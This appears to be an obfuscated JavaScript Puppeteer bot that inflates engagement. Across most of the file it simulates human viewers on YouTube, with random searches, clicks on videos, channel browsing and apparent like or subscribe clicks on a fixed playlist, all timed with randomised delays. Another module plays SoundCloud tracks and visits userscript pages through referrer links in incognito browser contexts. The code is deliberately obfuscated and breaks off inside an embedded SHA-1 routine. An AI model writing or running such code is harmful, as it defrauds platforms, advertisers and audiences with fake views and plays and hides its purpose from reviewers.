const a1 = b,
  a0 = d,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x4 * 0x53c + -0xf37 + 0x2428))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x5f9 * -0x1 + 0x26d9 + 0x2cd2 * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  const R = b;
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + R(0x3, 'wT(K')],
    'timeout': 0x0
  }), i ? await wait(0x3b * -0x26b + -0xa157 + 0x1a530 + (0x1 * -0x3d0a + -0x6e5c + -0x1 * -0xe5fe) * random()) : await standardWaitForNetIdle(f), await wait(0x1b86 + -0x4 * 0x27f + 0x1fe + (-0xb * 0x5f + -0x1 * -0x3262 + -0x11 * 0x6d) * random()), 0x53b * 0x2 + 0x2f * 0x1b + -0x7b5 * 0x2;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * -0xfde + 0xd * -0x5d + 0x281f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x8 * -0x2e7 + 0x8e6 + -0x201d;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2408 + 0x1 * 0x1eb2 + 0xb1f * -0x6);
    let h = e[f];
    if (c['EJdkYZ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1059 + 0x1e52 + -0x49 * 0x31, r, s, t = -0x1 * -0x10bb + 0x41d + -0x14d8; s = m['charAt'](t++); ~s && (r = q % (-0xf37 + 0x946 + 0x5f5) ? r * (-0x5f9 * -0x1 + 0x26d9 + 0x1649 * -0x2) + s : s, q++ % (0x3 * -0x7ed + -0x1ae4 + 0x32af)) ? o += String['fromCharCode'](0x1 * -0x1459 + -0x24ca + -0x1 * -0x3a22 & r >> (-(0x1b86 + -0x4 * 0x27f + -0x1188) * q & -0x1 * 0x20b + -0x1 * -0x1931 + -0x14 * 0x128)) : 0x53b * 0x2 + 0x2f * 0x1b + -0xf6b * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * -0xfde + 0xd * -0x5d + 0x1497, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x8 * -0x2e7 + 0x8e6 + -0x200e))['slice'](-(0x1 * -0x1435 + 0x2627 + -0x11f0));
        }
        return decodeURIComponent(p);
      };
      c['TEjjwi'] = i, b = arguments, c['EJdkYZ'] = !![];
    }
    const j = e[0xb1 + -0x911 + 0x10c * 0x8],
      k = f + j,
      l = b[k];
    return !l ? (h = c['TEjjwi'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function randomWait() {
  return await wait(0x1 * -0x1435 + 0x2627 + 0x196 + (0xb1 + -0x911 + 0x178 * 0x13) * random()), 0x97e * -0x1 + 0x1336 + -0x33d * 0x3;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x19f2 + 0x3bf + -0x1633 * -0x1, -0xb0c + -0x238f * 0x1 + -0x1 * -0x2ea2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x120f4 + -0x1b04b + 0x179b7) * getRandomInt(0x2246 + -0x1 * -0x1047 + -0x328b, -0x10bd * -0x1 + -0x1027 + -0x91), h)), 0x1 * 0x169 + -0x8b * -0x37 + -0x1f45;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1898 + -0x22f4 + -0x25 * -0x19c;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x40f * 0x3 + 0x2b1 * -0xd + 0x2f2b]['split']('\x20');
    for (let k = -0x2343 + 0x1 * -0x11ba + 0xa99 * 0x5; k < i['length']; k += -0xcf * -0x2 + 0x7f9 * 0x1 + -0x995)
      j += i[k] * h[i[k + (-0x1e * -0x5d + 0x161f + 0x841 * -0x4)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * 0x14b6 + -0xfb4 + 0x2470)['map'](l => Array['from'](l['children']))['flat'](0x2476 + -0x8 * -0x3a0 + -0x4175)['map'](l => l['childNodes'][0x38 * -0x4a + 0x1 * -0x2653 + 0x3684]['childNodes'][0xd * 0x18d + -0x1d35 + 0x90c]['childNodes'][-0x1ca0 + -0x1bf1 + 0x3892]['childNodes'][-0x17 * -0x120 + -0x1 * 0x896 + -0x2 * 0x8a5]['childNodes'][0x2c9 + -0x7 * -0x32d + -0x1903]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1156 * 0x2 + 0x2 * -0xecf + -0x2b * -0x196, 0x732 + 0x7 * -0x28f + 0x1e3f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x13 * 0xd9 + 0x589 * 0x3 + -0x1 * -0x19e2);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * 0xb915 + -0xd68b * -0x1 + 0xccea) * getRandomInt(-0x38f + 0x1319 * 0x2 + -0x22a1, 0x2 * 0x9d + 0x257 * 0x2 + -0xb * 0x89), h);
  return await wait(i), -0xd3e + 0x2de * 0x9 + -0xc8f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2281 + -0x20be + -0x1c3]['children'][-0x2 * -0x1087 + -0x1 * 0xacf + 0x5 * -0x473]['children'][0x4e4 * 0x1 + 0x4 * 0xb3 + -0x1 * 0x7b0]['children'][-0x1 * -0xeae + 0x76d * -0x5 + -0x1 * -0x1673]['children'][-0x1729 + -0x14f * 0x1d + 0x4 * 0xf47]['setAttribu' + 'te']('id', S(0x6, 'xwVO'));
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x218b * -0x1 + -0x3e * 0x3d + 0x3052 * 0x1;
}
async function searchAndView(f) {
  const V = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const U = d,
      T = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + T(0xd)) || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', U(0x0) + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x69 * 0x27 + -0x1 * 0x1b8f + 0xbf4 + (0x1381 + -0x75 + -0x12da * 0x1) * random()
  }), await wait(0x3 * 0x869 + -0x308 * -0x7 + -0x2c7f + (0x38 + -0x1 * -0x1733 + -0x163f) * random()), await f[V(0x1)]('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0x1da5 + 0x5e * -0x41 + 0x3585]['childNodes'][-0x2496 + -0x20d1 * -0x1 + -0x8a * -0x7]['childNodes'][-0x3 * 0x62b + -0x1 * -0x1073 + 0x20f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xd5 * 0x13 + -0x246b + 0x14a1]['childNodes'][0x1596 + -0x12f5 + -0x2a1]['childNodes'][0x2690 + 0x124a + 0x2 * -0x1c6c]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x29f * 0x7 + 0x5cf + 0xf7 * 0xd),
          r = 0x81 * -0x2b + 0x137a + -0x3 * -0xbb;
        for (let u = -0x1c6a + -0x2f2 * 0x9 + -0x26 * -0x172; u < q['length']; u += 0x3 + 0x12 * -0x10d + -0x2f * -0x67)
          r += q[u] * k[q[u + (0x1890 + 0x824 * -0x1 + -0x579 * 0x3)]];
        return r;
      }(n);
  });
  await wait((-0x1 * -0x3683 + -0x2ab * -0x29 + -0x694e) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x93 * -0x31f + -0x189d * -0xf + -0x251a0) * getRandomInt(0xdcd + 0x88a + -0x1 * 0x1656, 0x1 * -0x1a + 0x2cc + 0x55 * -0x8), h + (0xd3 * 0x1 + 0xb9 * 0x2d + -0xdd0));
  return await wait(i), 0x6b + 0x1 * 0x11f5 + -0x125f;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x243c + 0x1 * -0x207d + -0x3bf), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2666 + -0x25 * -0x45 + -0x24a7 + (-0x6ac + 0x553 + -0x10d * -0x5) * Math['random']());
    });
  }, 0x38b * 0xd + -0x24 + 0x3b7 * -0x5);
  await wait(0x8b72 * 0x7 + -0x85550 + 0x91912);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xb * -0xd37 + 0x1a3a4 + -0x35 * 0x63d) * getRandomInt(-0x1a6a + -0x21 * -0x5d + 0xe71, 0x90d + -0x2492 + 0xe * 0x1f9)), clearInterval(h), -0x2157 + -0x307 + 0x245f;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x169d + 0x192e + 0x5 * -0x98f;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x3fe + 0x1b4 + -0x5b1;
    await randomWait();
  }
  return 0xb7d + 0x1 * -0x6da + -0x2 * 0x251;
}

function fetchRandomSC() {
  const W = d;
  return Math['random']() <= 0x605 + 0x2ac + -0x8b1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x6 * -0x53 + -0x7a * -0x35 + -0x1750 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : W(0x15) + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + W(0x16) + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bq = [
    '__searchBo',
    'click',
    'dgZcMSoUWQjLcCoxsKW',
    'fCkiWQy0k8ou',
    'z2v0qxr0CMLIDq',
    'C2L0zs96AgLODq',
    'WQuZWPvTW5uoz8o1vqy',
    'tstcIKVcV8kuEHWXW54',
    'enuserjs.o',
    'WRVdKSkXWPxdLJtcJCodhs4',
    'start',
    'nYvfnIvcqIvbna',
    'l1PYzw4VuMvZAq',
    'EfjLywW',
    'https://gr',
    'e/slither.',
    'WOZdRCkiW5/dImkxW64TWRtcGa',
    'BZr0tenZAg1SyG',
    'sh;\x20Intel\x20',
    '0\x20(Windows',
    'y2XVC2u',
    'https://so',
    'ipboard&ut',
    'W5VcISkqaHirWPJdT8oWWOq',
    'ike\x20Gecko)',
    ',minecraft',
    'WRrEWPBdOmkgAMJdUmkzW6e',
    'B3LLzxmSBxiGyG',
    'Aw1PEMf0Aw9Ulq',
    'rg/en/scri',
    'BMrIB3GSBw9VBq',
    'W5tdT8oKWPhcJ8osWRHEW53dOG',
    'e_+',
    'Ahr0Chm6lY9JBW',
    'y0nHsvzYBhriEG',
    'W63dUc7cKCk9W6OvjW'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * -0xc + -0x110c * 0x1 + 0x1100 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0x22a3 + 0x2 * -0x131f + 0x48e1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x13934 + -0x744b * -0x1 + -0xfdb7 + getRandomInt(0x3c0b * 0x1 + -0x65e2 + 0x646f * 0x1, -0xb * 0x4e8 + -0x1654 * -0x2 + 0x7e80));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0x2599 + -0x118e + -0x140a), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x7 * 0x481 + 0x957 * -0x1 + 0x470 * -0x5;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x4 * -0x778 + -0x5b3 * -0x4 + -0x34ac, -0x68f + -0x160f + -0x2 * -0xe68)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x47 * -0x27 + -0x1f6b + 0x1c6a + floor((0x104a * -0x1 + -0x2 * 0x12be + 0x39ae) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xa8503418 + -0x3e80463a + 0x16301222),
          0xb3e48d + -0xab67d * 0x3 + 0x695b2 * -0x3,
          0x4ffc + 0x9 * 0x932 + -0x1 * 0x22be,
          0x1d * -0xb + 0x373 * 0x1 + -0x1b4
        ], y = [
          -0x11cf + 0x1 * -0x11f8 + 0x23df * 0x1,
          0x4 * 0x3cb + 0x1125 + -0x2041,
          0xea4 + -0x135f + 0x35 * 0x17,
          -0x1 * 0x258b + 0x3 * -0x1ee + 0x2b55
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x9c * -0xd + -0x3 * -0x878 + -0x117b)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xe27 + -0x1197 + -0xfdf * -0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x18c7 + -0x190e + 0x31d5 * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const X = d;
              J ? (A[0x95 * 0x39 + -0x5 * -0x361 + 0x3212 * -0x1] = A[-0x214f + 0x1089 + 0x10d6 * 0x1] = A[-0x9fc + 0x2 * 0x839 + -0x675] = A[0x2 * 0xe63 + 0x615 + -0x22d9] = A[-0xbed * 0x2 + -0x19c9 + 0x31a6] = A[0x1 * -0x173f + 0x58 * -0x31 + 0x281b] = A[-0x19 * -0x8e + -0x160 * 0x8 + -0x2d9] = A[-0x56 * -0x9 + -0xe12 + 0xb12] = A[0x3 * 0x5fe + 0x1d62 + -0x3 * 0xfc7] = A[0xd * -0x13 + 0x21cc + -0x137 * 0x1b] = A[-0x136c + 0x2 * 0x535 + 0x90b * 0x1] = A[0x1a3f * -0x1 + 0x2aa * -0x2 + 0x1f9d] = A[-0x1bd0 + -0x732 * 0x1 + 0x230d] = A[0x184b + 0x1 * 0x2452 + 0xc1d * -0x5] = A[-0x8 * -0x1c8 + 0x1 * -0x25dd + 0x17aa] = A[0xfe0 + 0x2552 + -0x3524] = A[0x23e3 + -0x2 * -0xfd9 + 0x4386 * -0x1] = -0x9f * 0x3a + -0x701 + 0x2b07, this['blocks'] = A) : this['blocks'] = [
                -0x80e * -0x3 + 0x1 * 0x1240 + 0x3d * -0xb2,
                0xf7 * 0x6 + 0x5cc + -0xb96 * 0x1,
                -0x1 * -0x156b + 0x2c5 * -0x8 + -0x7 * -0x1b,
                0x1 * -0x32 + 0xaeb + -0xab9,
                -0x1 * 0x1b6b + 0xc7f + 0x3bb * 0x4,
                -0xf99 + 0xa29 + 0x570,
                -0x19b8 + -0x1036 * 0x2 + 0x3a24,
                -0x56d + -0x8a2 + 0x1 * 0xe0f,
                -0xf * -0x1b0 + -0x143 + 0x2f * -0x83,
                -0x1edc + -0x26c4 + 0x1 * 0x45a0,
                -0x1c97 + -0x1557 + 0x31ee,
                0x10d4 * -0x2 + 0x88c * -0x4 + 0x43d8,
                -0x2 * -0xddc + 0x1 * -0x43d + -0x177b,
                0x1 * 0x1e75 + -0x23e7 + 0x2b9 * 0x2,
                0x20f8 + -0x12 * 0x6 + -0x823 * 0x4,
                0x7 * -0x531 + -0x9e * 0xe + 0x2cfb,
                0x182d + -0x22af + 0x21a * 0x5
              ], this['h0'] = -0x469f1fb * -0x15 + 0x185a9e3 * -0x34 + 0xab6c81 * 0x86, this['h1'] = 0x2f616b * 0x83b + -0x1939c7c3a + 0x2 * 0x7eb9ae0d, this['h2'] = -0x420d29af + -0x6ed2d0fc + 0x2c510df * 0x77, this['h3'] = -0xa * 0x8526ad + 0x1dc75c62 + -0x861852a, this['h4'] = -0x4bd6e7 * -0x1c9 + 0x1 * -0x777deb18 + -0xb3ee2aa9 * -0x1, this['block'] = this[X(0xa)] = this['bytes'] = this['hBytes'] = -0xc82 + -0x26cc + 0x21 * 0x18e, this['finalized'] = this['hashed'] = 0xb76 + 0x16d5 + -0x224b, this['first'] = 0x21e6 * -0x1 + -0xa5b + 0xce * 0x37;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x22b2 + 0x4ac + -0x275e * 0x1, O = J['length'] || 0x11 * 0x14f + 0x1e77 * 0x1 + -0x34b6, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1034 + 0x6f7 * 0x4 + 0x3 * -0xeb0, P[-0x1 * 0x1541 + -0x1f7 + 0x8 * 0x2e7] = this['block'], P[-0x1526 + 0x1843 + -0x30d] = P[-0x2611 + -0x17c2 + 0x3dd4] = P[0x4b * -0x61 + 0x1 * -0x9b5 + 0x2622] = P[0x1445 + 0x1 * -0x20d + -0x1235] = P[0x5cd + -0x25 * 0x1 + -0x5a4] = P[-0x22a + 0x2332 + -0x1b * 0x139] = P[-0x24b2 + -0xce * 0x2 + 0x2654] = P[-0x88c + 0x1b1 + -0x1 * -0x6e2] = P[0x2330 + -0x1158 + -0x11d0] = P[-0x1d37 + -0x1 * 0xa61 + 0x27a1] = P[0x1 * 0xfc5 + 0xe2b + -0x1de6] = P[-0xd14 + 0x1f * -0x12d + 0x1d6 * 0x1b] = P[0x396 * -0x1 + 0x2 * -0x68e + 0x85f * 0x2] = P[-0x15d3 * 0x1 + -0x10a4 + -0x244 * -0x11] = P[-0x3d * 0x5d + 0x108f * -0x1 + -0x1 * -0x26c6] = P[-0xde0 + -0x1f3a + 0x2d29] = 0x3fd + -0xbb6 + 0x7b9), K) {
                    for (N = this['start']; M < O && N < 0x191 * -0x5 + 0x54c * -0x7 + 0x1 * 0x2d29; ++M)
                      P[N >> 0x1118 + -0xfe2 + -0x134] |= J[M] << y[-0x12 * 0xfc + 0xb * 0x31d + -0x1084 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x11 * 0x93 + 0x10 * -0x166 + -0x2063 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x6c7 + 0xb7 + -0x6fe ? P[N >> -0x1674 + -0x1c2c + 0x32a2 * 0x1] |= L << y[-0x548 + 0x19e3 + -0x1498 & N++] : L < -0x3 * 0x1bc + -0x114b * -0x2 + -0x1562 ? (P[N >> 0x22d + -0x984 + 0x759] |= (-0x952 * 0x4 + 0x9fc + -0x167 * -0x14 | L >> -0x134 * 0x1d + 0xc * -0xd + 0x2386) << y[0x2d * 0x66 + 0x1717 * 0x1 + -0x2902 & N++], P[N >> 0xd4 * 0x20 + 0x1 * -0xdb8 + -0xcc6] |= (0xd08 + -0x15a7 + 0x91f * 0x1 | 0x1 * 0x1c27 + -0x1 * -0xb6b + 0x2753 * -0x1 & L) << y[0x7 * -0x4ae + -0x1573 + 0x15b * 0x28 & N++]) : L < -0x5b86 + 0x66f5 + 0xcc91 || L >= -0xd9b8 + -0x3 * 0x4c23 + 0x29e21 ? (P[N >> 0x25be + 0x1 * 0x18de + -0x6 * 0xa6f] |= (0xeb * -0x1c + 0x1 * -0x1645 + 0x30d9 | L >> 0xeb4 + 0x4d2 * 0x6 + 0x4 * -0xae5) << y[-0xda + 0x3b * -0x59 + 0x1560 & N++], P[N >> 0x51c + -0x92c * -0x3 + -0x209e] |= (-0x15c1 + -0x1 * -0x12cf + -0x1 * -0x372 | L >> -0x14d9 + 0x1edc + -0x9fd & 0x10d8 + -0x21d8 + -0x113f * -0x1) << y[-0x2047 + -0x1 * -0xc1a + 0xa18 * 0x2 & N++], P[N >> -0xc4 * 0x1d + 0x4 * 0x324 + 0x9a6] |= (0x6f3 + 0x1 * -0x10d2 + 0xa5f | 0x7 * -0x3db + 0x11 * 0x1cf + -0x383 & L) << y[-0x1e9c + 0x1 * 0x256b + -0x6cc & N++]) : (L = 0x4bd * 0x4e + 0x4 * 0x7286 + -0x23bae + ((-0x1b76 + -0xe9f * -0x1 + 0x10d6 & L) << 0x1 * 0x1079 + 0x1183 + -0x365 * 0xa | 0x3a5 + -0xf * -0x151 + -0x1365 & J['charCodeAt'](++M)), P[N >> -0x1838 + 0xe * -0x112 + 0x2736] |= (-0x1e0b * -0x1 + 0xb4f + -0x286a | L >> 0x117b * 0x1 + -0xf01 + 0x2 * -0x134) << y[0xf71 + 0xf86 + -0x1ef4 & N++], P[N >> -0x1e07 + -0x20f8 + 0x7f * 0x7f] |= (0x3 * -0x769 + 0x2 * 0x3df + 0xefd | L >> 0x23b * 0xb + 0x250f + -0x3d8c & 0x23c + -0x1bf8 + -0x2e3 * -0x9) << y[-0x2212 + -0x1c49 + 0x3e5e & N++], P[N >> 0x139a + -0xafe * -0x2 + -0x2994] |= (-0x38 + -0x1 * 0xbe1 + -0x81 * -0x19 | L >> -0x1fc3 + -0x13 * -0x7d + 0x1682 & 0x224d + 0x8e2 + 0x1 * -0x2af0) << y[-0x74 * 0x2f + 0x5 * 0x43d + 0x1e & N++], P[N >> 0x11 * -0xc7 + 0xd45 + -0xc] |= (0xdf7 + 0x1325 + 0x1 * -0x209c | 0x1eff + 0x7dc * -0x1 + -0x16e4 & L) << y[-0x2c7 * -0x1 + 0x3 * 0xa9 + 0x4bf * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1 * 0xcf2 + 0x9f * 0x29 + -0x2629 ? (this['block'] = P[0x1 * 0x373 + -0x2404 + 0x20a1 * 0x1], this['start'] = N - (-0xf * 0x256 + 0xff9 * 0x2 + 0x1ac * 0x2), this['hash'](), this['hashed'] = 0x10ed + 0x1aee + -0x15ed * 0x2) : this['start'] = N;
                }
                return this['bytes'] > 0x53ed44ec + 0xf20dc + 0x8669 * 0x1479f && (this['hBytes'] += this['bytes'] / (-0x1 * -0xfb3ac314 + -0x230 * 0xc2dbf0 + 0x1af0659ec) << 0x1e33 + 0x210 + 0x2043 * -0x1, this['bytes'] = this['bytes'] % (0x1f8680eb0 + -0x514f588 * -0x53 + -0x29e33a9c8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xb * -0x82 + -0x99d + 0x408;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
